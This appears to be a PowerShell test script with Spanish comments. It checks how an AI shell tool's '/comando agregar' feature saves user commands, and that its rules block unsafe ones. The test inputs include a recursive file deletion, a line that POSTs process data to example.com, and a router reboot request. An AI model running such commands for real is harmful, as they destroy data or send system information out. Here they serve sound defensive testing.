# /comando agregar con el modelo de verdad: el orden de las ordenes de /comando
# y nueve casos (dos que se guardan, uno que el usuario rechaza y seis que paran
# las reglas). Las funciones salen de bin\ai.ps1 por su arbol de sintaxis.
param([string]$Raiz = (Split-Path -Parent $PSScriptRoot), [string]$Proveedor = 'gemma')
# Ejercita las funciones REALES de /comando agregar (sacadas de bin\ai.ps1 por
# su arbol de sintaxis), con el modelo de verdad y respuestas ya escritas en
# lugar del teclado.
$ErrorActionPreference = 'Stop'
[Console]::OutputEncoding = [Text.Encoding]::UTF8
$root = $Raiz
. (Join-Path $root 'lib\providers.ps1')
. (Join-Path $root 'lib\core.ps1')
. (Join-Path $root 'lib\ui.ps1')
. (Join-Path $root 'lib\web.ps1')
. (Join-Path $root 'lib\equipo.ps1')
. (Join-Path $root 'lib\comandos.ps1')
foreach ($k in @($AI_COLOR.Keys)) { $AI_COLOR[$k] = '' }

$tok = $null; $err = $null
$ast = [System.Management.Automation.Language.Parser]::ParseFile((Join-Path $root 'bin\ai.ps1'), [ref]$tok, [ref]$err)
if ($err.Count) { throw "bin\ai.ps1 no se analiza: $($err[0].Message)" }
foreach ($f in 'Get-AIComandoOpinion', 'Show-AIComandoRevision', 'Save-AIComandoNuevo', 'Add-AIComando') {
    $d = $ast.Find({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq $f }, $true)
    if (-not $d) { throw "falta la funcion $f en bin\ai.ps1" }
    . ([scriptblock]::Create($d.Extent.Text))
}
# el orden de las ordenes de /comando, tal como estan en el guion
$patrones = @($ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.StringConstantExpressionAst] -and $n.Value -like '^/comandos?*' }, $true) | ForEach-Object { $_.Value })
function Orden($linea) { $i = 0; foreach ($p in $patrones) { $i++; if ($linea -match $p) { return $i } }; return 0 }
$mal = 0
function Ver([string]$que, [bool]$ok, $extra = '') { if ($ok) { Write-Output "  ok   $que" } else { $script:mal++; Write-Output "  MAL  $que  $extra" } }
Ver 'seis ordenes de /comando' ($patrones.Count -eq 6) $patrones.Count
Ver '/comando on            -> interruptor' ((Orden '/comando on') -eq 1)
Ver '/comando agregar n c   -> agregar'     ((Orden '/comando agregar ip-publica Invoke-RestMethod -Uri https://api.ipify.org') -eq 2)
Ver '/comando agregar       -> modo de uso' ((Orden '/comando agregar') -eq 3 -and (Orden '/comando agregar solo-nombre') -eq 3)
Ver '/comando quitar n      -> quitar'      ((Orden '/comando quitar ip-publica') -eq 4)
Ver '/comando y /comandos   -> lista'       ((Orden '/comando') -eq 5 -and (Orden '/comandos') -eq 5 -and (Orden '/comando lista') -eq 5)
Ver '/comando n             -> ejecutar'    ((Orden '/comando ip-publica') -eq 6)
Ver '/comandante            -> al modelo'   ((Orden '/comandante') -eq 0)

$prov  = Resolve-AIProvider $Proveedor
$Model = $prov.Model
$script:Web = $true
$CmdFile = Join-Path ([IO.Path]::GetTempPath()) ("comandos-agregar-" + [Guid]::NewGuid().ToString('N') + '.json')
$script:Comandos = @(); $script:ComandosMalos = @()
$script:Respuestas = @()
function Read-AILine { param($Prompt, $UsaPRL)
    Write-Host -NoNewline $Prompt
    if ($script:Respuestas.Count -eq 0) { Write-Host '<fin de entrada>'; return $null }
    $r = $script:Respuestas[0]; $script:Respuestas = @($script:Respuestas | Select-Object -Skip 1)
    Write-Host $r; return $r
}
function Caso($titulo, $nombre, $texto, $respuestas) {
    Write-Output ''; Write-Output "=== $titulo"; Write-Output "Usuario > /comando agregar $nombre $texto"
    $script:Respuestas = @($respuestas)
    $sw = [Diagnostics.Stopwatch]::StartNew()
    Add-AIComando $nombre $texto $false *>&1 | ForEach-Object { Write-Output ([string]$_) }
    Write-Output "    [$([Math]::Round($sw.Elapsed.TotalSeconds, 1)) s]"
}

Caso 'la IP publica: se guarda' 'ip-publica' 'Invoke-RestMethod -Uri https://api.ipify.org' @('mi IP publica, la que ven los sitios de internet', 's')
Ver 'guardado' ($script:Comandos.Count -eq 1 -and $script:Comandos[0].Nombre -eq 'ip-publica' -and $script:Comandos[0].Comando -eq 'Invoke-RestMethod -Uri https://api.ipify.org')
Caso 'un comando local: se guarda' 'Top-CPU' 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, CPU' @('los cinco procesos que mas procesador han gastado', 'si')
Ver 'guardado, con el nombre en minusculas' ($script:Comandos.Count -eq 2 -and $script:Comandos[1].Nombre -eq 'top-cpu')
Caso 'dice que no: no se guarda' 'antivirus' 'Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled' @('si el antivirus esta activo', 'n')
Ver 'no se guardo' ($script:Comandos.Count -eq 2)
Caso 'peligroso: lo paran las reglas, sin preguntar al modelo' 'limpiar' 'Get-ChildItem C:\Temp | Remove-Item -Recurse' @('s', 's')
Ver 'no se guardo' ($script:Comandos.Count -eq 2)
Caso 'un programa de fuera' 'mio' 'C:\Herramientas\x.exe' @('s', 's')
Caso 'saca datos del equipo' 'fuga' 'Get-Process | Invoke-RestMethod -Uri https://example.com -Method Post' @('s', 's')
Caso 'a la red local' 'router' 'Invoke-WebRequest -Uri http://192.168.0.1/reboot' @('s', 's')
Caso 'un alias' 'ip2' 'irm https://api.ipify.org' @('s', 's')
Caso 'un nombre que no vale' 'agregar' 'Get-Date' @('s', 's')
Ver 'ninguno de los cinco se guardo' ($script:Comandos.Count -eq 2)
Ver 'el fichero tiene los dos' (@((Read-AIComandos $CmdFile).Lista).Count -eq 2)
Write-Output ''; Write-Output '--- comandos.json'
Write-Output ([IO.File]::ReadAllText($CmdFile))
Remove-Item $CmdFile -ErrorAction SilentlyContinue
Write-Output "MAL = $mal"
exit $mal
